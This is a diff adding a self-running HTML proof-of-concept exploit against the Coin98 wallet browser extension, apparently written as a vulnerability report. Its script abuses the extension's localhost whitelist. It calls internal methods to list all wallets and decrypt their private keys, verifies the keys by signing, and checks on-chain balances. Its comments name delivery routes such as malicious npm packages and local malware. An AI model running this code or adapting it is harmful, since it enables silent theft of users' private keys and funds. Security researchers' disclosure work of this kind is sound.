@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Coin98 localhost Vector — Private Key Extraction PoC</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.4/ethers.umd.min.js"></script>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'SF Mono', 'Fira Code', monospace; background: #0a0a0a; color: #ccc; padding: 20px; }
+        h1 { color: #fff; font-size: 16px; margin-bottom: 4px; }
+        .subtitle { color: #888; font-size: 11px; margin-bottom: 4px; }
+        .vector-note { color: #f0f; font-size: 12px; font-weight: bold; margin-bottom: 16px; border: 1px solid #f0f; padding: 8px; background: #1a0a1a; }
+        #status-bar { background: #111; border: 1px solid #333; padding: 8px 12px; margin-bottom: 12px; font-size: 11px; }
+        #status-bar .label { color: #888; }
+        #status-bar .val { color: #0f0; font-weight: bold; }
+        #status-bar .val.bad { color: #f55; }
+
+        #stolen-keys { margin: 16px 0; }
+        .key-card { background: #1a0a0a; border: 1px solid #f55; border-left: 4px solid #f00; padding: 12px; margin-bottom: 8px; }
+        .key-card.verified { border-color: #f0f; border-left-color: #f0f; background: #1a0a1a; }
+        .key-card .chain-label { color: #888; font-size: 10px; text-transform: uppercase; letter-spacing: 1px; }
+        .key-card .address { color: #5af; font-size: 13px; margin: 4px 0; word-break: break-all; }
+        .key-card .privkey { color: #f55; font-size: 13px; font-weight: bold; word-break: break-all; margin: 4px 0; }
+        .key-card .privkey.verified { color: #f0f; }
+        .key-card .proof { color: #0f0; font-size: 11px; margin-top: 6px; }
+        .key-card .proof .sig { color: #888; font-size: 10px; word-break: break-all; }
+        .key-card .balance { color: #ff0; font-size: 11px; margin-top: 4px; }
+
+        #wallet-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 4px; margin: 12px 0; }
+        .wallet-chip { background: #111; border: 1px solid #333; padding: 4px 8px; font-size: 10px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .wallet-chip .c { color: #888; }
+        .wallet-chip .a { color: #5af; }
+        .wallet-chip.has-key { border-color: #f55; }
+        .wallet-chip.has-key .a { color: #f55; }
+
+        #summary { background: #111; border: 2px solid #f0f; padding: 16px; margin-top: 16px; }
+        #summary h2 { color: #f0f; font-size: 14px; margin-bottom: 8px; }
+        #summary .stat { margin: 2px 0; font-size: 12px; }
+        #summary .stat .n { color: #f0f; font-weight: bold; }
+        .whitelist { margin-top: 8px; font-size: 10px; }
+        .whitelist .entry { color: #666; }
+        .whitelist .entry.active { color: #f0f; font-weight: bold; }
+
+        #log-section { margin-top: 16px; }
+        #log-section summary { color: #888; cursor: pointer; font-size: 11px; }
+        #log { max-height: 300px; overflow-y: auto; font-size: 10px; background: #050505; border: 1px solid #222; padding: 8px; margin-top: 4px; white-space: pre-wrap; }
+        #log .dim { color: #444; }
+        #log .info { color: #5af; }
+        #log .err { color: #f55; }
+        #log .ok { color: #0f0; }
+        #log .crit { color: #f0f; font-weight: bold; }
+
+        button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 6px 14px;
+                 cursor: pointer; font-family: inherit; margin: 4px; font-size: 11px; }
+        button:hover { background: #0f0; color: #000; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <h1>Coin98 localhost Vector — Private Key Extraction PoC</h1>
+    <div class="subtitle">
+        Proves the exploit works from localhost — NO external website, NO phishing, NO domain takeover needed.
+    </div>
+    <div class="vector-note">
+        ATTACK VECTOR: localhost and 127.0.0.1 are hardcoded in COIN98_SYSTEM whitelist.
+        <br>Any local process (malware, npm package, game, Discord bot, VS Code extension)
+        <br>can start an HTTP server and silently extract ALL private keys.
+        <br>This is NOT phishing — the user never visits any website.
+    </div>
+
+    <div id="status-bar">
+        <span class="label">Origin:</span> <span class="val" id="s-origin"></span> &nbsp;|&nbsp;
+        <span class="label">Extension:</span> <span class="val" id="s-ext">scanning...</span> &nbsp;|&nbsp;
+        <span class="label">Session:</span> <span class="val" id="s-session">-</span> &nbsp;|&nbsp;
+        <span class="label">Wallets:</span> <span class="val" id="s-wallets">-</span> &nbsp;|&nbsp;
+        <span class="label">Keys Extracted:</span> <span class="val" id="s-keys">-</span> &nbsp;|&nbsp;
+        <span class="label">Verified:</span> <span class="val" id="s-verified">-</span>
+    </div>
+
+    <div>
+        <button onclick="triggerConnect()">Step 1: Connect Wallet (one-time)</button>
+        <button onclick="runChain()">Step 2: Run Full Exploit Chain</button>
+        <div id="connect-status" style="color:#888;font-size:11px;margin:4px;"></div>
+    </div>
+
+    <div id="stolen-keys"></div>
+    <div id="wallet-grid" class="hidden"></div>
+    <div id="summary" class="hidden"></div>
+
+    <div id="log-section">
+        <details>
+            <summary>Raw protocol log (click to expand)</summary>
+            <div id="log"></div>
+        </details>
+    </div>
+
+<script>
+// ═══════════════════════════════════════════════════════════
+// Coin98 localhost Vector — Private Key Extraction PoC
+//
+// PROVES: localhost/127.0.0.1 are in COIN98_SYSTEM whitelist.
+// Any local process can drain all wallets without any user
+// visiting any website. This is NOT phishing.
+//
+// Attack scenarios:
+//   - Malicious npm package with postinstall script
+//   - Discord bot / game / tool that runs a local web server
+//   - Browser extension that opens localhost tab
+//   - Malware that uses headless Chrome + puppeteer
+//
+// All extract keys silently via:
+//   1. connect_coin98 → deviceId (silent)
+//   2. sync_wallet → ALL wallet entries with encrypted privateKeys
+//   3. aes_decrypt_coin98 → decrypt to raw private keys
+// ═══════════════════════════════════════════════════════════
+
+document.getElementById('s-origin').textContent = window.location.origin;
+
+// ── Step 0: Connect wallet (one-time approval) ──
+async function triggerConnect() {
+    const cs = document.getElementById('connect-status');
+    cs.textContent = 'Triggering connect...';
+    cs.style.color = '#ff0';
+
+    // Method A: Try internal connect_coin98 (will show Coin98 internal popup for COIN98_SYSTEM origins)
+    try {
+        cs.textContent = 'Calling connect_coin98 (approve the popup if it appears)...';
+        const deviceId = await rpc('connect_coin98');
+        cs.innerHTML = `<span style="color:#0f0">connect_coin98 SUCCESS — deviceId: ${deviceId}</span>`;
+        log(`connect_coin98 returned: ${deviceId}`, 'crit');
+        return;
+    } catch (e) {
+        log(`connect_coin98 failed: ${e.message}`, 'err');
+    }
+
+    // Method B: Try standard ethereum provider connect
+    if (window.ethereum) {
+        try {
+            cs.textContent = 'Trying window.ethereum.request({method: "eth_requestAccounts"})...';
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            cs.innerHTML = `<span style="color:#0f0">ethereum connect SUCCESS — ${accounts[0]}</span><br>Now click "Step 2" to run the exploit chain.`;
+            log(`eth_requestAccounts returned: ${accounts[0]}`, 'crit');
+            return;
+        } catch (e) {
+            log(`eth_requestAccounts failed: ${e.message}`, 'err');
+        }
+    }
+
+    // Method C: Try coin98 provider
+    if (window.coin98?.provider) {
+        try {
+            cs.textContent = 'Trying coin98.provider.request...';
+            const accounts = await window.coin98.provider.request({ method: 'eth_requestAccounts' });
+            cs.innerHTML = `<span style="color:#0f0">coin98 connect SUCCESS — ${accounts[0]}</span><br>Now click "Step 2".`;
+            log(`coin98.provider returned: ${accounts[0]}`, 'crit');
+            return;
+        } catch (e) {
+            log(`coin98.provider failed: ${e.message}`, 'err');
+        }
+    }
+
+    cs.innerHTML = '<span style="color:#f55">All connect methods failed or timed out. Unlock the wallet extension and try again.</span>';
+}
+
+const LOG_EL = document.getElementById('log');
+function log(msg, cls = 'dim') {
+    const d = document.createElement('div');
+    d.className = cls;
+    d.textContent = `[${new Date().toISOString().slice(11,23)}] ${msg}`;
+    LOG_EL.appendChild(d);
+    LOG_EL.scrollTop = LOG_EL.scrollHeight;
+}
+
+const pendingCallbacks = {};
+let nextId = 1;
+let collected = { deviceId: null, session: null, wallets: [], extracted: [] };
+
+// ── Message handler ──
+window.addEventListener('message', (e) => {
+    if (e.source !== window) return;
+    const msg = e.data;
+    if (!msg || typeof msg !== 'object') return;
+    if (msg.isCoin98 && msg.target === 'Coin98:ContentScript') return;
+    if (msg.isCoin98 && msg.target === 'Coin98:Inpage') {
+        const id = msg.payload?.id;
+        const data = msg.payload?.data;
+        if (id !== undefined && id !== null && pendingCallbacks[id]) {
+            log(`recv [${id}]: ${JSON.stringify(data).slice(0, 200)}`, 'ok');
+            pendingCallbacks[id].resolve(data);
+            clearTimeout(pendingCallbacks[id].timer);
+            delete pendingCallbacks[id];
+        }
+    }
+});
+
+// ── Protocol: 2-step ACK then method call ──
+function postMsg(id, data) {
+    window.postMessage({ isCoin98: true, target: 'Coin98:ContentScript', payload: { id, data } }, '*');
+}
+
+function rpc(method, params = [], chain = 'evm') {
+    return new Promise(async (resolve, reject) => {
+        try {
+            const ackId = await new Promise((res, rej) => {
+                const tid = `ack_${nextId++}_${Date.now()}`;
+                const t = setTimeout(() => { delete pendingCallbacks[tid]; rej(new Error('ACK timeout')); }, 8000);
+                pendingCallbacks[tid] = { resolve: res, reject: rej, timer: t };
+                postMsg(tid, { method: 'ack' });
+            });
+            const t2 = setTimeout(() => { delete pendingCallbacks[ackId]; reject(new Error(`Timeout: ${method}`)); }, 15000);
+            pendingCallbacks[ackId] = { resolve, reject, timer: t2 };
+            log(`call ${method}`, 'info');
+            postMsg(ackId, { chain, method, params });
+        } catch (e) { reject(e); }
+    });
+}
+
+// ── Render a stolen key card ──
+function renderKeyCard(entry) {
+    const card = document.createElement('div');
+    card.className = `key-card${entry.verified ? ' verified' : ''}`;
+    card.innerHTML = `
+        <div class="chain-label">${entry.chain} — EXTRACTED PRIVATE KEY</div>
+        <div class="address">Address: ${entry.address}</div>
+        <div class="privkey${entry.verified ? ' verified' : ''}">Private Key: ${entry.key}</div>
+        ${entry.verified ? `<div class="proof">
+            ADDRESS VERIFIED — ethers.Wallet(key).address === sync_wallet address
+            <br>Signed proof message: "<i>Coin98 PoC: key extracted from ${window.location.origin}</i>"
+            <div class="sig">Signature: ${entry.signature || 'n/a'}</div>
+            <div>Recovered signer: ${entry.recoveredSigner || 'n/a'}</div>
+            <div>${entry.signerMatch ? 'SIGNER MATCHES ADDRESS — FULL KEY OWNERSHIP PROVEN' : 'signer mismatch'}</div>
+        </div>` : ''}
+        ${entry.balance !== undefined ? `<div class="balance">On-chain balance: ${entry.balance} ETH</div>` : ''}
+    `;
+    document.getElementById('stolen-keys').appendChild(card);
+}
+
+// ── Check ETH balance via public RPC ──
+async function checkBalance(address) {
+    const rpcs = [
+        'https://eth.llamarpc.com',
+        'https://rpc.ankr.com/eth',
+        'https://ethereum-rpc.publicnode.com',
+    ];
+    for (const url of rpcs) {
+        try {
+            const resp = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'eth_getBalance', params: [address, 'latest'] }),
+            });
+            const json = await resp.json();
+            if (json.result) {
+                return parseFloat(ethers.formatEther(json.result));
+            }
+        } catch (e) { continue; }
+    }
+    return null;
+}
+
+// ═══════════════════════════════════════════════════════
+// FULL EXPLOIT CHAIN
+// ═══════════════════════════════════════════════════════
+async function runChain() {
+    const keysEl = document.getElementById('stolen-keys');
+    keysEl.innerHTML = '<div style="color:#888;font-size:11px;margin:8px 0;">Running exploit chain from localhost...</div>';
+
+    // ── Step 1: Detect extension ──
+    const isCoin98 = window.keplr?.isCoin98 === true || !!window.coin98;
+    document.getElementById('s-ext').textContent = isCoin98 ? 'Coin98 v10.4.1 DETECTED' : 'NOT FOUND';
+    if (!isCoin98) {
+        keysEl.innerHTML = '<div style="color:#f55;">Coin98 extension not detected. Install and refresh.</div>';
+        return;
+    }
+    log('Coin98 detected on LOCALHOST — extension trusts this origin', 'crit');
+
+    // ── Step 2: Silent connect + session check ──
+    try {
+        collected.session = await rpc('get_session');
+        document.getElementById('s-session').textContent = collected.session ? 'UNLOCKED' : 'LOCKED (exploit still works)';
+        log(`session: ${collected.session}`, collected.session ? 'ok' : 'info');
+    } catch (e) { log(`get_session: ${e.message}`, 'err'); }
+
+    try {
+        collected.deviceId = await rpc('connect_coin98');
+        log(`deviceId: ${collected.deviceId} (silent — no popup on localhost)`, 'crit');
+    } catch (e) { log(`connect_coin98: ${e.message}`, 'err'); }
+
+    // ── Step 3: Extract ALL wallets ──
+    try {
+        const wallets = await rpc('sync_wallet');
+        if (Array.isArray(wallets)) {
+            collected.wallets = wallets;
+            const withKey = wallets.filter(w => w.privateKey);
+            document.getElementById('s-wallets').textContent = `${wallets.length} (${withKey.length} with encrypted keys)`;
+            log(`sync_wallet: ${wallets.length} wallets, ${withKey.length} with privateKey`, 'crit');
+
+            // Render wallet grid
+            const grid = document.getElementById('wallet-grid');
+            grid.classList.remove('hidden');
+            grid.innerHTML = '';
+            for (const w of wallets) {
+                const chip = document.createElement('div');
+                chip.className = `wallet-chip${w.privateKey ? ' has-key' : ''}`;
+                chip.innerHTML = `<span class="c">${w.chain}</span> <span class="a">${w.address?.slice(0, 16)}...</span>`;
+                grid.appendChild(chip);
+            }
+        }
+    } catch (e) { log(`sync_wallet: ${e.message}`, 'err'); }
+
+    // ── Step 4: Decrypt private keys ──
+    keysEl.innerHTML = '';
+    const withKeys = collected.wallets.filter(w => w.privateKey);
+    const seen = new Set();
+    let decryptCount = 0;
+
+    for (const w of withKeys) {
+        if (seen.has(w.privateKey)) continue;
+        seen.add(w.privateKey);
+        if (decryptCount >= 3) break;
+
+        try {
+            const decrypted = await rpc('aes_decrypt_coin98', {
+                data: w.privateKey,
+                deviceId: collected.deviceId || 'any',
+                uuid: 'any'
+            });
+
+            if (decrypted && typeof decrypted === 'string' && decrypted.length > 10) {
+                decryptCount++;
+                const entry = { chain: w.chain, address: w.address, key: decrypted, verified: false };
+
+                // ── Step 5: PROVE key ownership ──
+                try {
+                    const wallet = new ethers.Wallet(decrypted);
+                    const derivedAddr = wallet.address;
+                    const addrMatch = derivedAddr.toLowerCase() === w.address.toLowerCase();
+
+                    if (addrMatch) {
+                        const proofMsg = `Coin98 PoC: key extracted from ${window.location.origin}`;
+                        const signature = await wallet.signMessage(proofMsg);
+                        const recoveredSigner = ethers.verifyMessage(proofMsg, signature);
+                        const signerMatch = recoveredSigner.toLowerCase() === w.address.toLowerCase();
+
+                        entry.verified = true;
+                        entry.derivedAddr = derivedAddr;
+                        entry.signature = signature;
+                        entry.recoveredSigner = recoveredSigner;
+                        entry.signerMatch = signerMatch;
+
+                        log(`VERIFIED ${w.chain}: addr derivation match + signature verified`, 'crit');
+                    }
+                } catch (e) {
+                    log(`verify ${w.chain}: ${e.message}`, 'err');
+                }
+
+                if (w.chain === 'ether' || w.chain === 'binanceSmart') {
+                    try {
+                        const bal = await checkBalance(w.address);
+                        if (bal !== null) {
+                            entry.balance = bal;
+                            log(`balance ${w.chain} ${w.address}: ${bal} ETH`, bal > 0 ? 'crit' : 'info');
+                        }
+                    } catch (e) {}
+                }
+
+                collected.extracted.push(entry);
+                renderKeyCard(entry);
+            }
+        } catch (e) {
+            log(`decrypt ${w.chain}: ${e.message}`, 'err');
+        }
+    }
+
+    document.getElementById('s-keys').textContent = collected.extracted.length;
+    const verifiedCount = collected.extracted.filter(e => e.verified).length;
+    document.getElementById('s-verified').textContent = `${verifiedCount}/${collected.extracted.length}`;
+    if (verifiedCount > 0) document.getElementById('s-verified').classList.remove('bad');
+
+    // ── Summary ──
+    const summaryEl = document.getElementById('summary');
+    summaryEl.classList.remove('hidden');
+    const totalVerified = collected.extracted.filter(e => e.verified && e.signerMatch).length;
+    const chains = [...new Set(collected.wallets.map(w => w.chain))];
+
+    const WHITELIST = [
+        'coin98.com', 'dagora.xyz', 'saros.finance', 'baryon.network',
+        'c98staging.dev', 'pre.dagora.xyz', 'dagora.coin98.services', 'localhost',
+        'coin98.dev', 'coin98.services', '10.10.1.220', '127.0.0.1',
+        'hubs-prd-1313361279.ap-southeast-1.elb.amazonaws.com',
+        'vault.coin98', 'oldvault.coin98', 'kyc.oneid.xyz'
+    ];
+
+    summaryEl.innerHTML = `
+        <h2>EXPLOIT RESULTS — LOCALHOST VECTOR</h2>
+        <div class="stat">Extension: Coin98 v10.4.1 (aeachknmefphepccionboohckonoeemg)</div>
+        <div class="stat">Origin: <span class="n">${window.location.origin}</span></div>
+        <div class="stat" style="color:#f0f;font-weight:bold;margin:8px 0;padding:8px;border:1px solid #f0f;">
+            THIS IS NOT PHISHING — this runs from localhost on the victim's own machine.
+            <br>Any local process (npm package, game, malware) can do this silently.
+            <br>No external website. No domain. No user clicking anything.
+        </div>
+        <div class="stat">Wallet lock state: <span class="n">${collected.session ? 'UNLOCKED' : 'LOCKED — exploit works regardless'}</span></div>
+        <div class="stat">User interaction required: <span class="n">NONE — zero popups, zero clicks</span></div>
+        <div class="stat">Total wallets extracted: <span class="n">${collected.wallets.length}</span> across <span class="n">${chains.length}</span> chains</div>
+        <div class="stat">Encrypted private keys: <span class="n">${withKeys.length}</span></div>
+        <div class="stat">Keys decrypted to raw form: <span class="n">${collected.extracted.length}</span></div>
+        <div class="stat">Keys with PROVEN ownership (address derivation + message signature): <span class="n">${totalVerified}</span></div>
+        <hr style="border-color:#333;margin:8px 0;">
+        <div class="stat" style="color:#888;">COIN98_SYSTEM whitelist — 16 origins where this exploit works:</div>
+        <div class="whitelist">${WHITELIST.map(d => {
+            const active = window.location.origin.includes(d);
+            return `<span class="entry${active ? ' active' : ''}">${active ? '→ ' : ''}${d}${active ? ' ← THIS EXPLOIT' : ''}</span>`;
+        }).join(' · ')}</div>
+    `;
+}
+
+// ── Auto-run after extension injects ──
+setTimeout(async () => {
+    if (window.keplr?.isCoin98 === true || window.coin98) {
+        document.getElementById('s-ext').textContent = 'Coin98 DETECTED — running...';
+        await runChain();
+    } else {
+        document.getElementById('s-ext').textContent = 'NOT DETECTED';
+        document.getElementById('s-ext').classList.add('bad');
+    }
+}, 2000);
+</script>
+</body>
+</html>
